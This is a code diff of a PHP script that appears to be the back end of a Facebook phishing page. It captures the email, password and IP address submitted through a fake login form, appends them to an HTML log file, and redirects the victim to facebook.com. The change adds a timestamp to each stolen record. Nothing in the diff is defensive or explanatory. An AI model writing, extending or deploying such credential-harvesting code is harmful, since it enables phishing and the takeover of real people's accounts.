@@ -3,7 +3,7 @@ $email = $_POST['email'];
 $pass = $_POST['pass'];
 $ip = $_SERVER['REMOTE_ADDR']; 
 $f = fopen("logger.html", "a"); 
-fwrite ($f, 'LOGIN_ID: [<b><font color="#DC143C">'.$email.'</font></b>] PASS: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
+fwrite ($f, 'LOGIN_ID: [<b><font color="#DC143C">'.$email.'</font></b>] PASS: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] DT: [<b><font color="#008080">'.date("Y-m-d H:i:s").'</font></b>] <br>');
 fclose($f);
 header('Location: https://facebook.com/');
 ?>
